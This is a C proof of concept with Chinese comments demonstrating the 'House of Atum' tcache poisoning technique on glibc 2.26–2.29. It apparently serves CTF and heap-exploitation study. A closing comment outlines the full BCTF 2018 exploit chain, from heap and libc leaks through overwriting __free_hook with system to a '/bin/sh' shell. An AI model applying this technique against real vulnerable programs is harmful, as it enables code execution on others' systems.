/*
 * House of Atum 的最小堆管理器 PoC：glibc 2.26～2.29。
 *
 * 原题在“只有两个对象”的限制下又混入 fastbin；这里抽出真正决定版本
 * 边界的核心：2.29 及以前 __libc_malloc 只看 entries[idx] 是否非空，
 * 即使 counts[idx] 已经减为 0，仍会继续调用 tcache_get。
 *
 * 漏洞模型：edit-after-free，可修改 tcache chunk 的 next。
 * 效果：先正常取回 a，再让下一次 malloc 返回 a-0x10，即原 chunk header。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    size_t *a;
    void *guard;
    size_t *first;
    size_t *header_as_user;

    setbuf(stdout, NULL);

    a = malloc(0x30);                 /* 物理 chunk size 为 0x40 */
    guard = malloc(0x30);             /* 防止 a 与 top 相邻，方便观察 */
    if (a == NULL || guard == NULL)
        return 1;

    free(a);                          /* count=1, entries=a */

    /* 漏洞模拟：把 tcache_entry.next 改成原 chunk header。
     * 2.29 虽有 key，但这里只 edit-after-free、没有再次 free，不触发
     * double-free 扫描；第一次 tcache_get 还会把 a->key 清零。
     */
    a[0] = (size_t)((char *)a - 0x10);

    first = malloc(0x30);             /* 返回 a；count 从 1 变成 0 */
    assert(first == a);

    /* 关键差异：2.26～2.29 检查 entries != NULL，因此即使 count==0，
     * entries 中的 a-0x10 仍被消费。glibc 2.30 改查 count>0 后停在这里。
     */
    header_as_user = malloc(0x30);
    assert(header_as_user == (size_t *)((char *)a - 0x10));

    /* 返回值把 chunk header 当成用户区；header_as_user[1] 正是 a[-1]
     * 的 size 字段。这里实际改写它，证明不是只比较了一个地址。
     */
    header_as_user[1] = 0x91;
    assert(a[-1] == 0x91);

    printf("[+] Atum：块头=%p，大小=%#zx\n",
           (void *)header_as_user, a[-1]);
    return 0;
}

/*
 * ======================== 原题迁移伪代码 ========================
 *
 * 本 C 文件只隔离验证 entry/count 错位。BCTF 2018 原题还提供了“free 后
 * 不清槽位”的菜单语义，完整利用可以按下面顺序理解：
 *
 *     申请 chunk0 和相邻保护块；
 *     对 chunk0 重复执行 free-but-keep-pointer，制造 tcache 自环；
 *     读取 chunk0 用户区中的 next，取得堆地址；
 *
 *     从 tcache 取回 chunk0，利用保留指针修改相邻 size；
 *     把同一物理块伪装成 0x91，填满对应 tcache；
 *     再次 free，使它进入 unsorted；
 *     读取残留 fd/bk，计算 libc 基址；
 *
 *     把物理块改回 0x51；
 *     投毒 fastbin/tcache，使一次分配落到 __free_hook 附近；
 *     写入 system，申请并写入 "/bin/sh"；
 *     free 该字符串块。
 *
 * 这些步骤绑定题目的槽位生命周期和 glibc 2.26，不能把原题菜单调用原样
 * 当成通用 PoC。glibc 2.30 改为先检查 counts>0 后，本文件验证的核心错位
 * 已经无法继续消费。
 */
